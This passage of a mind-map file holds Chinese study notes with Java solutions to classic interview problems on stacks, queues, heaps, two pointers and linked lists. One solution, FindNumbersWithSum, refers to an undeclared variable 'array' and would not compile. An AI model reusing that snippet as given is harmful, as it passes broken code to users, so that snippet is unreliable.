    return -1;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1520083868" CREATED="1754750400533" MODIFIED="1754750414054" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      栈队列堆
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1339217625" CREATED="1754750414025" MODIFIED="1754751130514" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/9.%20%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    9. 用两个栈实现队列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/54275ddae22f475981afa2244dd448c6?tpId=13&amp;tqId=11158&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        用两个栈来实现一个队列，完成队列的 Push 和 Pop 操作。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        in 栈用来处理入栈（push）操作，out 栈用来处理出栈（pop）操作。一个元素进入 in 栈之后，出栈的顺序被反转。当元素要出栈时，需要先进入 out 栈，此时元素出栈顺序再一次被反转，因此出栈顺序就和最开始入栈顺序是相同的，先进入的元素先退出，这就是队列的顺序。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/3ea280b5-be7d-471b-ac76-ff020384357c.gif" width="450"/>
        
      </div>
      <br/>
      

      <pre>Stack&lt;Integer&gt; in = new Stack&lt;Integer&gt;();
Stack&lt;Integer&gt; out = new Stack&lt;Integer&gt;();
public void push(int node) {
    in.push(node);
}
public int pop() throws Exception {
    if (out.isEmpty())
        while (!in.isEmpty())
            out.push(in.pop());
    if (out.isEmpty())
        throw new Exception(&quot;queue is empty&quot;);
    return out.pop();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1527586632" CREATED="1754750414029" MODIFIED="1754751131031" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/30.%20%E5%8C%85%E5%90%AB%20min%20%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    30. 包含 min 函数的栈
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/4c776177d2c04c2494f2555c9fcc1e49?tpId=13&amp;tqId=11173&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        实现一个包含 min() 函数的栈，该方法返回当前栈中最小的值。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        使用一个额外的 minStack，栈顶元素为当前栈中最小的值。在对栈进行 push 入栈和 pop 出栈操作时，同样需要对 minStack 进行入栈出栈操作，从而使 minStack 栈顶元素一直为当前栈中最小的值。在进行 push 操作时，需要比较入栈元素和当前栈中最小值，将值较小的元素 push 到 minStack 中。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104013936126.png" width="350px"/>
        
      </div>
      <br/>
      

      <pre>private Stack&lt;Integer&gt; dataStack = new Stack&lt;&gt;();
private Stack&lt;Integer&gt; minStack = new Stack&lt;&gt;();
public void push(int node) {
    dataStack.push(node);
    minStack.push(minStack.isEmpty() ? node : Math.min(minStack.peek(), node));
}
public void pop() {
    dataStack.pop();
    minStack.pop();
}
public int top() {
    return dataStack.peek();
}
public int min() {
    return minStack.peek();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_645722231" CREATED="1754750414033" MODIFIED="1754751131031" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/31.%20%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E3%80%81%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    31. 栈的压入、弹出序列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/d77d11405cc7470d82554cb392585106?tpId=13&amp;tqId=11174&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。
      </p>
      <p>
        例如序列 1,2,3,4,5 是某栈的压入顺序，序列 4,5,3,2,1 是该压栈序列对应的一个弹出序列，但 4,3,5,1,2 就不可能是该压栈序列的弹出序列。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        使用一个栈来模拟压入弹出操作。每次入栈一个元素后，都要判断一下栈顶元素是不是当前出栈序列 popSequence 的第一个元素，如果是的话则执行出栈操作并将 popSequence 往后移一位，继续进行判断。
      </p>
      <pre>public boolean IsPopOrder(int[] pushSequence, int[] popSequence) {
    int n = pushSequence.length;
    Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();
    for (int pushIndex = 0, popIndex = 0; pushIndex &lt; n; pushIndex++) {
        stack.push(pushSequence[pushIndex]);
        while (popIndex &lt; n &amp;&amp; !stack.isEmpty() 
                &amp;&amp; stack.peek() == popSequence[popIndex]) {
            stack.pop();
            popIndex++;
        }
    }
    return stack.isEmpty();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_880187512" CREATED="1754750414036" MODIFIED="1754751131529" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/40.%20%E6%9C%80%E5%B0%8F%E7%9A%84%20K%20%E4%B8%AA%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    40. 最小的 K 个数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/6a296eb82cf844ca8539b57c23e6e9bf?tpId=13&amp;tqId=11182&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        解题思路
      </h2>
      <h3>
        大小为 K 的最小堆
      </h3>
      <ul>
        <li>
          复杂度：O(NlogK) + O(K)
        </li>
        <li>
          特别适合处理海量数据
        </li>
      </ul>
      <p>
        维护一个大小为 K 的最小堆过程如下：使用大顶堆。在添加一个元素之后，如果大顶堆的大小大于 K，那么将大顶堆的堆顶元素去除，也就是将当前堆中值最大的元素去除，从而使得留在堆中的元素都比被去除的元素来得小。
      </p>
      <p>
        应该使用大顶堆来维护最小堆，而不能直接创建一个小顶堆并设置一个大小，企图让小顶堆中的元素都是最小元素。
      </p>
      <p>
        Java 的 PriorityQueue 实现了堆的能力，PriorityQueue 默认是小顶堆，可以在在初始化时使用 Lambda 表达式 (o1, o2) -&gt; o2 - o1 来实现大顶堆。其它语言也有类似的堆数据结构。
      </p>
      <pre>public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] nums, int k) {
    if (k &gt; nums.length || k &lt;= 0)
        return new ArrayList&lt;&gt;();
    PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1);
    for (int num : nums) {
        maxHeap.add(num);
        if (maxHeap.size() &gt; k)
            maxHeap.poll();
    }
    return new ArrayList&lt;&gt;(maxHeap);
}</pre>
      <h3>
        快速选择
      </h3>
      <ul>
        <li>
          复杂度：O(N) + O(1)
        </li>
        <li>
          只有当允许修改数组元素时才可以使用
        </li>
      </ul>
      <p>
        快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。可以利用这个特性找出数组的第 K 个元素，这种找第 K 个元素的算法称为快速选择算法。
      </p>
      <pre>public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] nums, int k) {
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    if (k &gt; nums.length || k &lt;= 0)
        return ret;
    findKthSmallest(nums, k - 1);
    /* findKthSmallest 会改变数组，使得前 k 个数都是最小的 k 个数 */
    for (int i = 0; i &lt; k; i++)
        ret.add(nums[i]);
    return ret;
}
public void findKthSmallest(int[] nums, int k) {
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int j = partition(nums, l, h);
        if (j == k)
            break;
        if (j &gt; k)
            h = j - 1;
        else
            l = j + 1;
    }
}
private int partition(int[] nums, int l, int h) {
    int p = nums[l];     /* 切分元素 */
    int i = l, j = h + 1;
    while (true) {
        while (i != h &amp;&amp; nums[++i] &lt; p) ;
        while (j != l &amp;&amp; nums[--j] &gt; p) ;
        if (i &gt;= j)
            break;
        swap(nums, i, j);
    }
    swap(nums, l, j);
    return j;
}
private void swap(int[] nums, int i, int j) {
    int t = nums[i];
    nums[i] = nums[j];
    nums[j] = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1796286655" CREATED="1754750414040" MODIFIED="1754751134993" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/41.1%20%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    41.1 数据流中的中位数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/9be0172896bd43948f8a32fb954e1be1?tpId=13&amp;tqId=11216&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>/* 大顶堆，存储左半边元素 */
private PriorityQueue&lt;Integer&gt; left = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1);
/* 小顶堆，存储右半边元素，并且右半边元素都大于左半边 */
private PriorityQueue&lt;Integer&gt; right = new PriorityQueue&lt;&gt;();
/* 当前数据流读入的元素个数 */
private int N = 0;
public void Insert(Integer val) {
    /* 插入要保证两个堆存于平衡状态 */
    if (N % 2 == 0) {
        /* N 为偶数的情况下插入到右半边。
         * 因为右半边元素都要大于左半边，但是新插入的元素不一定比左半边元素来的大，
         * 因此需要先将元素插入左半边，然后利用左半边为大顶堆的特点，取出堆顶元素即为最大元素，此时插入右半边 */
        left.add(val);
        right.add(left.poll());
    } else {
        right.add(val);
        left.add(right.poll());
    }
    N++;
}
public Double GetMedian() {
    if (N % 2 == 0)
        return (left.peek() + right.peek()) / 2.0;
    else
        return (double) right.peek();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_579585103" CREATED="1754750414044" MODIFIED="1754751133531" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/41.2%20%E5%AD%97%E7%AC%A6%E6%B5%81%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%97%E7%AC%A6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    41.2 字符流中第一个不重复的字符
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目描述
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/00de97733b8e4f97a3fb5c680ee10720?tpId=13&amp;tqId=11207&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符 &quot;go&quot; 时，第一个只出现一次的字符是 &quot;g&quot;。当从该字符流中读出前六个字符“google&quot; 时，第一个只出现一次的字符是 &quot;l&quot;。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        使用统计数组来统计每个字符出现的次数，本题涉及到的字符为都为 ASCII 码，因此使用一个大小为 128 的整型数组就能完成次数统计任务。
      </p>
      <p>
        使用队列来存储到达的字符，并在每次有新的字符从字符流到达时移除队列头部那些出现次数不再是一次的元素。因为队列是先进先出顺序，因此队列头部的元素为第一次只出现一次的字符。
      </p>
      <pre>private int[] cnts = new int[128];
private Queue&lt;Character&gt; queue = new LinkedList&lt;&gt;();
public void Insert(char ch) {
    cnts[ch]++;
    queue.add(ch);
    while (!queue.isEmpty() &amp;&amp; cnts[queue.peek()] &gt; 1)
        queue.poll();
}
public char FirstAppearingOnce() {
    return queue.isEmpty() ? '#' : queue.peek();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1436612885" CREATED="1754750414050" MODIFIED="1754751161966" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/59.%20%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    59. 滑动窗口的最大值
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <h2>
      题目链接
    </h2>
    <p>
      <a href="https://www.nowcoder.com/practice/1624bc35a45c42c0bc17d17fa0cba788?tpId=13&amp;tqId=11217&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
    </p>
    <h2>
      题目描述
    </h2>
    <p>
      给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。
    </p>
    <p>
      例如，如果输入数组 {2, 3, 4, 2, 6, 2, 5, 1} 及滑动窗口的大小 3，那么一共存在 6 个滑动窗口，他们的最大值分别为 {4, 4, 6, 6, 6, 5}。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104020702453.png" width="430" height="227" style="width: 430px; height: 227px;"/>
      
    </p>
    <p>
      <br/>
      
    </p>
    <h2>
      解题思路
    </h2>
    <p>
      维护一个大小为窗口大小的大顶堆，顶堆元素则为当前窗口的最大值。
    </p>
    <p>
      假设窗口的大小为 M，数组的长度为 N。在窗口向右移动时，需要先在堆中删除离开窗口的元素，并将新到达的元素添加到堆中，这两个操作的时间复杂度都为 log<sub>2</sub>M，因此算法的时间复杂度为 O(Nlog<sub>2</sub>M)，空间复杂度为 O(M)。
    </p>
    <pre><code class="language-plaintext">public ArrayList&lt;Integer&gt; maxInWindows(int[] num, int size) {
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    if (size &gt; num.length || size &lt; 1)
        return ret;
    PriorityQueue&lt;Integer&gt; heap = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1);  /* 大顶堆 */
    for (int i = 0; i &lt; size; i++)
        heap.add(num[i]);
    ret.add(heap.peek());
    for (int i = 0, j = i + size; j &lt; num.length; i++, j++) {            /* 维护一个大小为 size 的大顶堆 */
        heap.remove(num[i]);
        heap.add(num[j]);
        ret.add(heap.peek());
    }
    return ret;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1450193322" CREATED="1754750400537" MODIFIED="1754750414071" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      双指针
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1461988863" CREATED="1754750414056" MODIFIED="1754751189687" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/57.1%20%E5%92%8C%E4%B8%BA%20S%20%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    57.1 和为 S 的两个数字
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <h2>
      题目链接
    </h2>
    <p>
      <a href="https://www.nowcoder.com/practice/390da4f7a00f44bea7c2f3d19491311b?tpId=13&amp;tqId=11195&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
    </p>
    <h2>
      题目描述
    </h2>
    <p>
      在有序数组中找出两个数，使得和为给定的数 S。如果有多对数字的和等于 S，输出两个数的乘积最小的。
    </p>
    <h2>
      解题思路
    </h2>
    <p>
      使用双指针，一个指针指向元素较小的值，一个指针指向元素较大的值。指向较小元素的指针从头向尾遍历，指向较大元素的指针从尾向头遍历。
    </p>
    <ul>
      <li>
        <p>
          如果两个指针指向元素的和 sum == target，那么这两个元素即为所求。
        </p>
      </li>
      <li>
        <p>
          如果 sum &gt; target，移动较大的元素，使 sum 变小一些；
        </p>
      </li>
      <li>
        <p>
          如果 sum &lt; target，移动较小的元素，使 sum 变大一些。
        </p>
      </li>
    </ul>
    <pre><code class="language-plaintext">public ArrayList&lt;Integer&gt; FindNumbersWithSum(int[] nums, int target) {
    int i = 0, j = nums.length - 1;
    while (i &lt; j) {
        int cur = nums[i] + array[j];
        if (cur == target)
            return new ArrayList&lt;&gt;(Arrays.asList(nums[i], nums[j]));
        if (cur &lt; target)
            i++;
        else
            j--;
    }
    return new ArrayList&lt;&gt;();
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_314681782" CREATED="1754750414059" MODIFIED="1754751168219" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/57.2%20%E5%92%8C%E4%B8%BA%20S%20%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    57.2 和为 S 的连续正数序列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目描述
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/c451a3fd84b64cb19485dad758a55ebe?tpId=13&amp;tqId=11194&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输出所有和为 S 的连续正数序列。例如和为 100 的连续序列有：
      </p>
      <pre>[9, 10, 11, 12, 13, 14, 15, 16]
[18, 19, 20, 21, 22]。</pre>
      <h2>
        解题思路
      </h2>
      <pre>public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindContinuousSequence(int sum) {
    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();
    int start = 1, end = 2;
    int curSum = 3;
    while (end &lt; sum) {
        if (curSum &gt; sum) {
            curSum -= start;
            start++;
        } else if (curSum &lt; sum) {
            end++;
            curSum += end;
        } else {
            ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;();
            for (int i = start; i &lt;= end; i++)
                list.add(i);
            ret.add(list);
            curSum -= start;
            start++;
            end++;
            curSum += end;
        }
    }
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1327800863" CREATED="1754750414065" MODIFIED="1754751168193" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/58.1%20%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    58.1 翻转单词顺序列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目描述
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/3194a4f4cf814f63919d0790578d51f3?tpId=13&amp;tqId=11197&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <pre>Input:
&quot;I am a student.&quot;
Output:
&quot;student. a am I&quot;</pre>
      <h2>
        解题思路
      </h2>
      <p>
        先翻转每个单词，再翻转整个字符串。
      </p>
      <p>
        题目应该有一个隐含条件，就是不能用额外的空间。虽然 Java 的题目输入参数为 String 类型，需要先创建一个字符数组使得空间复杂度为 O(N)，但是正确的参数类型应该和原书一样，为字符数组，并且只能使用该字符数组的空间。任何使用了额外空间的解法在面试时都会大打折扣，包括递归解法。
      </p>
      <pre>public String ReverseSentence(String str) {
    int n = str.length();
    char[] chars = str.toCharArray();
    int i = 0, j = 0;
    while (j &lt;= n) {
        if (j == n || chars[j] == ' ') {
            reverse(chars, i, j - 1);
            i = j + 1;
        }
        j++;
    }
    reverse(chars, 0, n - 1);
    return new String(chars);
}
private void reverse(char[] c, int i, int j) {
    while (i &lt; j)
        swap(c, i++, j--);
}
private void swap(char[] c, int i, int j) {
    char t = c[i];
    c[i] = c[j];
    c[j] = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1933218053" CREATED="1754750414068" MODIFIED="1754751168408" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/58.2%20%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    58.2 左旋转字符串
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/12d959b108cb42b1ab72cef4d36af5ec?tpId=13&amp;tqId=11196&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        将字符串 S 从第 K 位置分隔成两个子字符串，并交换这两个子字符串的位置。
      </p>
      <pre>Input:
S=&quot;abcXYZdef&quot;
K=3
Output:
&quot;XYZdefabc&quot;</pre>
      <h2>
        解题思路
      </h2>
      <p>
        先将 &quot;abc&quot; 和 &quot;XYZdef&quot; 分别翻转，得到 &quot;cbafedZYX&quot;，然后再把整个字符串翻转得到 &quot;XYZdefabc&quot;。
      </p>
      <pre>public String LeftRotateString(String str, int n) {
    if (n &gt;= str.length())
        return str;
    char[] chars = str.toCharArray();
    reverse(chars, 0, n - 1);
    reverse(chars, n, chars.length - 1);
    reverse(chars, 0, chars.length - 1);
    return new String(chars);
}
private void reverse(char[] chars, int i, int j) {
    while (i &lt; j)
        swap(chars, i++, j--);
}
private void swap(char[] chars, int i, int j) {
    char t = chars[i];
    chars[i] = chars[j];
    chars[j] = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_223290694" CREATED="1754750400541" MODIFIED="1754750414102" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      链表
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1489657577" CREATED="1754750414072" MODIFIED="1754751207669" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/6.%20%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    6. 从尾到头打印链表
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/d0267f7f55b3412ba93bd35cfa8e8035?tpId=13&amp;tqId=11156&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        从尾到头反过来打印出每个结点的值。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f5792051-d9b2-4ca4-a234-a4a2de3d5a57.png" width="300px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <h3>
        1. 使用递归
      </h3>
      <p>
        要逆序打印链表 1-&gt;2-&gt;3（3,2,1)，可以先逆序打印链表 2-&gt;3(3,2)，最后再打印第一个节点 1。而链表 2-&gt;3 可以看成一个新的链表，要逆序打印该链表可以继续使用求解函数，也就是在求解函数中调用自己，这就是递归函数。
      </p>
      <pre>public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) {
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    if (listNode != null) {
        ret.addAll(printListFromTailToHead(listNode.next));
        ret.add(listNode.val);
    }
    return ret;
}</pre>
      <h3>
        2. 使用头插法
      </h3>
      <p>
        头插法顾名思义是将节点插入到头部：在遍历原始链表时，将当前节点插入新链表的头部，使其成为第一个节点。
      </p>
      <p>
        链表的操作需要维护后继关系，例如在某个节点 node1 之后插入一个节点 node2，我们可以通过修改后继关系来实现：
      </p>
      <pre>node3 = node1.next;
node2.next = node3;
node1.next = node2;</pre>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/58c8e370-3bec-4c2b-bf17-c8d34345dd17.gif" width="220px"/>
        
      </div>
      <br/>
      

      <p>
        为了能将一个节点插入头部，我们引入了一个叫头结点的辅助节点，该节点不存储值，只是为了方便进行插入操作。不要将头结点与第一个节点混起来，第一个节点是链表中第一个真正存储值的节点。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0dae7e93-cfd1-4bd3-97e8-325b032b716f-1572687622947.gif" width="420px"/>
        
      </div>
      <br/>
      

      <pre>public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) {
    // 头插法构建逆序链表
    ListNode head = new ListNode(-1);
    while (listNode != null) {
        ListNode memo = listNode.next;
        listNode.next = head.next;
        head.next = listNode;
        listNode = memo;
    }
    // 构建 ArrayList
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    head = head.next;
    while (head != null) {
        ret.add(head.val);
        head = head.next;
    }
    return ret;
}</pre>
      <h3>
        3. 使用栈
      </h3>
      <p>
        栈具有后进先出的特点，在遍历链表时将值按顺序放入栈中，最后出栈的顺序即为逆序。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9d1deeba-4ae1-41dc-98f4-47d85b9831bc.gif" width="340px"/>
        
      </div>
      <br/>
      

      <pre>public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) {
    Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();
    while (listNode != null) {
        stack.add(listNode.val);
        listNode = listNode.next;
    }
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    while (!stack.isEmpty())
        ret.add(stack.pop());
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1757569466" CREATED="1754750414075" MODIFIED="1754751210134" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/18.1%20%E5%9C%A8%20O(1)%20%E6%97%B6%E9%97%B4%E5%86%85%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E8%8A%82%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    18.1 在 O(1) 时间内删除链表节点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        解题思路
      </h2>
      <p>
        ① 如果该节点不是尾节点，那么可以直接将下一个节点的值赋给该节点，然后令该节点指向下下个节点，再删除下一个节点，时间复杂度为 O(1)。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1176f9e1-3442-4808-a47a-76fbaea1b806.png" width="600"/>
        
      </div>
      <br/>
      

      <p>
        ② 否则，就需要先遍历链表，找到节点的前一个节点，然后让前一个节点指向 null，时间复杂度为 O(N)。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4bf8d0ba-36f0-459e-83a0-f15278a5a157.png" width="600"/>
        
      </div>
      <br/>
      

      <p>
        综上，如果进行 N 次操作，那么大约需要操作节点的次数为 N-1+N=2N-1，其中 N-1 表示 N-1 个不是尾节点的每个节点以 O(1) 的时间复杂度操作节点的总次数，N 表示 1 个尾节点以 O(N) 的时间复杂度操作节点的总次数。(2N-1)/N ~ 2，因此该算法的平均时间复杂度为 O(1)。
